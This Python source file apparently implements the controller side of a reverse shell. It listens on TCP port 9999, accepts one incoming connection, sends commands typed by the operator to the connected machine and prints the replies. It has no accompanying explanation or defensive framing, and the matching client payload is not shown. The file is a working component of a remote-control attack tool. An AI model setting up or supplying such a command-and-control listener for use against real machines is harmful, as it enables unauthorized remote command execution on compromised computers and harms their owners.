import sys
import time
import threading
import socket

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
        
    except socket.error as msg:
        print("Socket creation error: " +  str(msg))

def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port " +  str(port))
        s.bind((host, port))
        s.listen(5)
        print("Socket created successfully and listening on " +  str(port))
    except socket.error as msg:
        print("Socket bingding error: " +  str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established !" + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close

# send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit(0)
        if len(cmd.encode(encoding="utf-8")) > 0:
            conn.send(cmd.encode(encoding="utf-8"))
            client_response = conn.recv(4096).decode("utf-8")
            print(client_response, end="")

def main():
    socket_create()
    socket_bind()
    socket_accept()

main()
